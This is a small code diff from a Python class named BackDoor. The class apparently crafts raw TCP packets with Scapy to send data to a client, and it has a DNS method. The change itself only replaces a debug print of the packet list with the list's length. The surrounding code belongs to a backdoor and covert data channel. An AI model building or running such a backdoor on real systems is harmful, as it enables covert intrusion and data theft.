@@ -290,7 +290,7 @@ class BackDoor:
         # Add packet to specify end of msg
         packet = IP(dst=self.client) / TCP(sport=src, dport=self.send_port) / Raw(load=terminator)
         packets.append(packet)
-        print(f"packet array done: {packets}")
+        print(f"packet array done: {len(packets)}")
         self.send_pkt(packets)
 
     def create_dns(self, data: List, name: str) -> None:
